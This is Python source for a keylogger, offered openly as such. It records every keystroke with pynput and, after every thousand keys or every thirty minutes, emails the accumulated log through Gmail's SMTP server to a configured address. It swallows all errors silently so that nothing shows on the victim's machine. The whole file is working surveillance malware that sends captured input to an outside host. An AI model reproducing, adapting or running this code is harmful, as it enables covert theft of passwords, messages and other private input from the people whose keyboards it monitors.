import smtplib
import ssl
import datetime
import time

# keylogger
from pynput import keyboard as kb

# gmail
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

##############################################################################
waiting = 1800  # Waiting time in seconds
numKey = 1000

# user and password GMAIL
username = ""
password = ""

# destination GMAIL
destination = ""
##############################################################################

log_key = str()
timeout = time.time() + waiting
countKey = 1


def count():
    if countKey == numKey:
        return True
    else:
        return False


def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False


def __gmailSend__(title='Title default'):
    # Create message
    message = MIMEMultipart('alternative')
    message['Subject'] = 'keylogger'
    message['From'] = password
    message['To'] = destination

    date = datetime.datetime.now()  # Date naw
    date = date.strftime("%D")

    html = f"""
    <html>
    <body>
    <h1>{title} [{date}]</h1> 
    <h3>{log_key}</h3><br>
    </body>
    </html>
    """
    # Message HTML
    msg_HTML = MIMEText(html, 'html')  # Content HTML
    message.attach(msg_HTML)
    message = message.as_string()

    try:
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as server:
            server.login(username, password)
            server.sendmail(username, destination, message)
    except:
        pass


def keys(key):
    keyPress = str(key)
    key = ["Key.backspace", "Key.space", "'\x13'", "Key.enter"]

    # Decorate
    if keyPress == key[0]:
        keyWrite = ""

    elif keyPress == key[1]:
        keyWrite = "[ SPACE ]"

    elif keyPress == key[2]:
        keyWrite = " [ Ctrl C ] "

    elif keyPress == key[3]:
        keyWrite = "[ ENTER ]"

    elif str(len(keyPress)) == "3":
        keyWrite = keyPress[1:2]

    else:
        keyWrite = keyPress

    global countKey

    try:
        global log_key
        log_key = f'{log_key}{keyWrite}'
    except:
        pass

    try:
        if count():
            countKey = 0
            # keyWrite = "{}\n".format(keyWrite)
            __gmailSend__(title='numKey')
        else:
            countKey += 1
    except:
        pass

    try:
        # Send file log.txt
        if TimeOut():
            __gmailSend__(title='timeout')
            global timeout
            timeout = time.time() + waiting
    except:
        pass


# Start unlimited cycle
while True:
    with kb.Listener(keys) as escuchador:
        escuchador.join()
